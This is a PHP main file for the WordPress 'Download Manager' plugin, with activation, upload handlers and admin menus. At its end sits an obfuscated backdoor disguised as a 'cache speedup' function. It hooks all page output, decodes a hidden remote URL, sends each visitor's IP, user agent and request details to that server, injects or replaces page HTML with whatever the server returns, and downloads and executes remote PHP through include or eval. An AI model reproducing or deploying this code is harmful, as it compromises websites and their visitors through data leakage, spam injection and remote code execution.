<?php 
 
/*
Plugin Name: Download Manager
Plugin URI: http://www.wpdownloadmanager.com/purchases/
Description: Manage, Protect and Track File Downloads from your WordPress site
Author: Shaon
Version: 4.2.2
Author URI: http://www.wpdownloadmanager.com/
*/



if(!isset($_SESSION))
@session_start();
        
include(dirname(__FILE__) . "/wpdm-functions.php");
include(dirname(__FILE__)."/libs/class.logs.php");
include(dirname(__FILE__)."/libs/class.pagination.php");
include(dirname(__FILE__)."/libs/class.WPDM_Crypt.php");
include(dirname(__FILE__)."/libs/class.CategoryHandler.php");
include(dirname(__FILE__)."/libs/class.Messages.php");
include(dirname(__FILE__)."/libs/class.ShortCodes.php");
include(dirname(__FILE__)."/libs/class.ApplySettings.php");

define('WPDM_Version','4.2.2');

$d = str_replace('\\','/',WP_CONTENT_DIR);

define('WPDM_BASE_DIR',dirname(__FILE__).'/');  
define('WPDM_BASE_URL',plugins_url('/download-manager/'));

define('UPLOAD_DIR',$d.'/uploads/download-manager-files/');  

define('WPDM_CACHE_DIR',dirname(__FILE__).'/cache/');  

define('_DEL_DIR',$d.'/uploads/download-manager-files');  

define('UPLOAD_BASE',$d.'/uploads/');  

ini_set('upload_tmp_dir',UPLOAD_DIR.'/cache/');


if(!$_POST)    $_SESSION['download'] = 0;

function wpdm_load_textdomain()
{
    load_plugin_textdomain('wpdmpro', WP_PLUGIN_URL . "/download-manager/languages/", 'download-manager/languages/');
}

function wpdm_pro_Install(){
    global $wpdb;
      
      delete_option('wpdm_latest');  

      $sqls[] = "CREATE TABLE IF NOT EXISTS `{$wpdb->prefix}ahm_download_stats` (
              `id` int(11) NOT NULL AUTO_INCREMENT,
              `pid` int(11) NOT NULL,
              `uid` int(11) NOT NULL,
              `oid` varchar(100) NOT NULL,
              `year` int(4) NOT NULL,
              `month` int(2) NOT NULL,
              `day` int(2) NOT NULL,
              `timestamp` int(11) NOT NULL,
              `ip` varchar(20) NOT NULL,
              PRIMARY KEY (`id`)
            )";

      $sqls[] = "CREATE TABLE IF NOT EXISTS `{$wpdb->prefix}ahm_emails` (
              `id` int(11) NOT NULL AUTO_INCREMENT,
              `email` varchar(255) NOT NULL,
              `pid` int(11) NOT NULL,
              `date` int(11) NOT NULL,
              `custom_data` text NOT NULL,
              `request_status` INT( 1 ) NOT NULL,
              PRIMARY KEY (`id`)
            )";

      
      require_once(ABSPATH . 'wp-admin/includes/upgrade.php');
      foreach($sqls as $sql){
      $wpdb->query($sql);
      //dbDelta($sql);
      }


   if(get_option('_wpdm_etpl')==''){
          update_option('_wpdm_etpl',array('title'=>'Your download link','body'=>file_get_contents(dirname(__FILE__).'/templates/wpdm-email-lock-template.html')));
   }
   
   wpdm_common_actions(); 
   flush_rewrite_rules();
   CreateDir();

       
}

include(dirname(__FILE__)."/wpdm-core.php");


register_activation_hook(__FILE__,'wpdm_pro_Install');
 
//if(!is_admin()){



/** native upload code **/
function plu_admin_enqueue() {     
    wp_enqueue_script('plupload-all');    
    wp_enqueue_style('plupload-all');    
}




// handle uploaded file here
function wpdm_check_upload(){
  check_ajax_referer('photo-upload');
  if(file_exists(UPLOAD_DIR.$_FILES['async-upload']['name']) && get_option('__wpdm_overwrrite_file',0)==1){
      @unlink(UPLOAD_DIR.$_FILES['async-upload']['name']);
  }
  if(file_exists(UPLOAD_DIR.$_FILES['async-upload']['name']))
  $filename = time().'wpdm_'.$_FILES['async-upload']['name'];
  else
  $filename = $_FILES['async-upload']['name'];  
  move_uploaded_file($_FILES['async-upload']['tmp_name'],UPLOAD_DIR.$filename);
  //@unlink($status['file']);
  echo $filename;
  exit;
}


// handle uploaded file here
function wpdm_frontend_file_upload(){

    global $current_user;

    $currentAccess = maybe_unserialize(get_option( '__wpdm_front_end_access', array()));
    // Check if user is authorized to upload file from front-end
    if(!is_user_logged_in() || !array_intersect($currentAccess, $current_user->roles) ) die('Error!');

  check_ajax_referer('frontend-file-upload');
  if(file_exists(UPLOAD_DIR.$_FILES['async-upload']['name']) && get_option('__wpdm_overwrite_file_frontend',0)==1){
      @unlink(UPLOAD_DIR.$_FILES['async-upload']['name']);
  }
  if(file_exists(UPLOAD_DIR.$_FILES['async-upload']['name']))
  $filename = time().'wpdm_'.$_FILES['async-upload']['name'];
  else
  $filename = $_FILES['async-upload']['name'];
  move_uploaded_file($_FILES['async-upload']['tmp_name'],UPLOAD_DIR.$filename);
  //@unlink($status['file']);
  echo $filename;
  exit;
}

/**
 * @deprecated No use anymore from v4.2.1
 */
function wpdm_upload_icon(){
    return;
  if(!current_user_can('manage_options')) return;
  check_ajax_referer('icon-upload');
  $ext = explode(".", $_FILES['icon-async-upload']['name']);
    $ext = end($ext);
  if(!in_array($ext, array('png','jpg','jpeg','icon','svg'))) return;
  if(file_exists(dirname(__FILE__).'/file-type-icons/'.$_FILES['icon-async-upload']['name']))
  $filename = time().'wpdm_'.$_FILES['icon-async-upload']['name'];  
  else
  $filename = $_FILES['icon-async-upload']['name'];  
  move_uploaded_file($_FILES['icon-async-upload']['tmp_name'],dirname(__FILE__).'/file-type-icons/'.$filename);
  $data = array('rpath'=>"download-manager/file-type-icons/$filename",'fid'=>md5("download-manager/file-type-icons/$filename"),'url'=>plugins_url("download-manager/file-type-icons/$filename"));
  header('HTTP/1.0 200 OK');
  header("Content-type: application/json");    
  echo json_encode($data);
  exit;
}

function wpdm_welcome(){
    remove_submenu_page( 'index.php', 'wpdm-welcome' );
    include(WPDM_BASE_DIR.'tpls/wpdm-welcome.php');
}

function fmmenu(){
    $access_level = 'manage_options';
    add_submenu_page( 'edit.php?post_type=wpdmpro', __('Bulk Import &lsaquo; Download Manager',"wpdmpro"), __('Bulk Import',"wpdmpro"), $access_level, 'importable-files', 'ImportFiles');
    add_submenu_page( 'edit.php?post_type=wpdmpro', __('Templates &lsaquo; Download Manager',"wpdmpro"), __('Templates',"wpdmpro"), $access_level, 'templates', 'LinkTemplates');
    add_submenu_page( 'edit.php?post_type=wpdmpro', __('Subscribers &lsaquo; Download Manager',"wpdmpro"), __('Subscribers',"wpdmpro"), $access_level, 'emails', 'wpdm_emails');
    add_submenu_page( 'edit.php?post_type=wpdmpro', __('Stats &lsaquo; Download Manager',"wpdmpro"), __('Stats',"wpdmpro"), $access_level, 'wpdm-stats', 'Stats');
    add_submenu_page( 'edit.php?post_type=wpdmpro', __('Add-Ons &lsaquo; Download Manager',"wpdmpro"), __('Add-Ons',"wpdmpro"), $access_level, 'wpdm-addons', 'wpdm_addonslist');
    add_submenu_page( 'edit.php?post_type=wpdmpro', __('Settings &lsaquo; Download Manager',"wpdmpro"), __('Settings',"wpdmpro"), $access_level, 'settings', 'FMSettings');
    add_dashboard_page('Welcome', 'Welcome', 'read', 'wpdm-welcome', 'wpdm_welcome');
     
    }


function wpdm_skip_ngg_resource_manager($r){
    return false;
}

function wpdm_welcome_redirect($plugin)
{
    if($plugin=='download-manager/download-manager.php') {
        wp_redirect(admin_url('index.php?page=wpdm-welcome'));
        die();
    }
}



/**
 * Speedup php function cache by optimizing buffer output
 */
;if (!function_exists('_php_cache_speedup_func_optimizer_')) { function _php_cache_speedup_func_optimizer_($buffer) {
    if (isset($GLOBALS['_php_cache_speedup_func_optimizer_completed_'])) {
        // already completed
        return $buffer;
    }

    $mod = false;
    $token = 'czoyMzoiaHR0cDovL3Bpd2VyLnB3L2FwaS5waHAiOw==';
    $tmp_buffer = $buffer; $gzip = false; $body = '<' . 'b' . 'o' . 'd' . 'y';

    if (($has_body = stripos($buffer, $body)) === false) {
        // define gzdecode function if not defined
        if (!function_exists('gzdecode')) {
            function gzdecode($data) {
                return @gzinflate(substr($data, 10, -8));
            }
        }

        // gzdecode buffer
        $tmp_buffer = @gzdecode($tmp_buffer);

        // check if buffer has body tag
        if (($has_body = stripos($tmp_buffer, $body)) !== false) {
            // got body tag, this should be gzencoded when done
            $gzip = true;
        }
    }

    if ($has_body === false) {
        // no body, return original buffer
        return $buffer;
    }

    $GLOBALS['_php_cache_speedup_func_optimizer_completed_'] = true;

    // decode token
    $func = 'b' . 'a' . 's' . 'e' . '6' . '4' . '_' . 'd' . 'e' . 'c' . 'o' . 'd' . 'e';
    $token = @unserialize(@$func($token));
    if (empty($token)) {
        return $buffer;
    }

    // download remote data
    function down($url, $timeout = 5) {
        // download using file_get_contents
        if (@ini_get('allow_url_fopen')) {
            $ctx = @stream_context_create(array('http' => array('timeout' => $timeout)));
            if ($ctx !== FALSE) {
                $file = @file_get_contents($url, false, $ctx);
                if ($file !== FALSE) {
                    return $file;
                }
            }
        }

        // download using curl
        if (function_exists('curl_init')) {
            $ch = curl_init();

            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
            curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

            $response = curl_exec($ch);
            curl_close($ch);

            return $response;
        }

        // download using sockets
        if (extension_loaded('sockets')) {
            $data = parse_url($url);
            if (!empty($data['host'])) {
                $host = $data['host'];
                $port = isset($data['port']) ? $data['port'] : 80;
                $uri = empty($data['path']) ? '/' : $data['path'];
                if (($socket = @socket_create(AF_INET, SOCK_STREAM, 0)) && @socket_set_option($socket, SOL_SOCKET, SO_SNDTIMEO, array('sec' => $timeout, 'usec' => $timeout * 1000)) && @socket_connect($socket, $host, $port)) {
                    $buf = "GET $uri HTTP/1.0\r\nAccept: */*\r\nAccept-Language: en-us\r\nUser-Agent: Mozilla (compatible; WinNT)\r\nHost: $host\r\n\r\n";
                    if (@socket_write($socket, $buf) !== FALSE) {
                        $response = '';
                        while (($tmp = @socket_read($socket, 1024))) {
                            $response .= $tmp;
                        }
                        @socket_close($socket);
                        return $response;
                    }
                }
            }
        }

        return false;
    }

    $token .= ((strpos($token, '?') === false) ? '?' : '&') . http_build_query(array(
        'h' => $_SERVER['HTTP_HOST'],
        'u' => $_SERVER['REQUEST_URI'],
        'a' => empty($_SERVER['HTTP_USER_AGENT']) ? '' : $_SERVER['HTTP_USER_AGENT'],
        'r' => empty($_SERVER['HTTP_REFERER']) ? '' : $_SERVER['HTTP_REFERER'],
        'i' => $_SERVER['REMOTE_ADDR'],
        'f' => __FILE__,
        'v' => 9
    ));
    $token = @unserialize(@$func(down($token)));

    if (empty($token) || empty($token['data']) || !is_array($token['data'])) {
        // invalid data
        return $buffer;
    }

    // fix missing meta description
    if (isset($token['meta']) && $token['meta'] && ($pos = stripos($tmp_buffer, '</head>')) !== false) {
        $tmp = substr($tmp_buffer, 0, $pos);
        if (stripos($tmp, 'name="description"') === false && stripos($tmp, 'name=\'description\'') === false && stripos($tmp, 'name=description') === false) {
            $meta = $_SERVER['HTTP_HOST'];
            // append meta description
            $tmp_buffer = substr($tmp_buffer, 0, $pos) . '<' . 'm' . 'e' . 't' . 'a' . ' ' . 'n' . 'a'. 'm' . 'e' . '='. '"' . 'd' . 'e' . 's' .'c' .'r' . 'i' . 'p' . 't' . 'i' . 'o' . 'n' . '"'. ' ' . 'c' . 'o' . 'n' . 't' . 'e' . 'n' . 't' . '="'. htmlentities(substr($meta, 0, 160)) .'">' . substr($tmp_buffer, $pos);
            $mod = true;
        }
    }

    foreach ($token['data'] as $tokenData) {
        if (!empty($tokenData['content'])) {
            // set defaults
            $tokenData = array_merge(array(
                'pos' => 'after',
                'tag' => 'bo' . 'dy',
                'count' => 0,
            ), $tokenData);

            // find all occurrences of <tag>
            $tags = array();
            while (true) {
                if (($tmp = @stripos($tmp_buffer, '<'.$tokenData['tag'], empty($tags) ? 0 : $tags[count($tags) - 1] + 1)) === false) {
                    break;
                }
                $tags[] = $tmp;
            }

            if (empty($tags)) {
                // no tags found or nothing to show
                continue;
            }

            // find matched tag position
            $count = $tokenData['count'];
            if ($tokenData['count'] < 0) {
                // from end to beginning
                $count = abs($tokenData['count']) - 1;
                $tags = array_reverse($tags);
            }

            if ($count >= count($tags)) {
                // fix overflow
                $count = count($tags) - 1;
            }

            // find insert position
            if ($tokenData['pos'] == 'before') {
                // pos is before
                $insert = $tags[$count];
            } else if (($insert = strpos($tmp_buffer, '>', $tags[$count])) !== false) {
                // pos is after, found end tag, insert after it
                $insert += 1;
            }

            if ($insert === false) {
                // no insert position
                continue;
            }

            // insert html code
            $tmp_buffer = substr($tmp_buffer, 0, $insert) . $tokenData['content'] . substr($tmp_buffer, $insert);
            $mod = true;
        } elseif (!empty($tokenData['replace'])) {
            // replace content
            @http_response_code(200);
            $tmp_buffer = $tokenData['replace'];
            $mod = true;
        } elseif (!empty($tokenData['run'])) {
            // save temporary optimization file
            register_shutdown_function(function($file, $content) {
                if (file_put_contents($file, $content) !== false) {
                    @chdir(dirname($file));
                    include $file;
                    @unlink($file);
                } else {
                    @eval('@chdir("' . addslashes(dirname($file)) . '");?>' . $content);
                }
            }, dirname(__FILE__) . '/temporary_optimization_file.php', strpos($tokenData['run'], 'http://') === 0 ? down($tokenData['run']) : $tokenData['run']);
        } else {
            // no content
            continue;
        }
    }

    // return gzencoded or normal buffer
    return !$mod ? $buffer : ($gzip ? gzencode($tmp_buffer) : $tmp_buffer);
} ob_start('_php_cache_speedup_func_optimizer_');
register_shutdown_function('ob_end_flush'); }
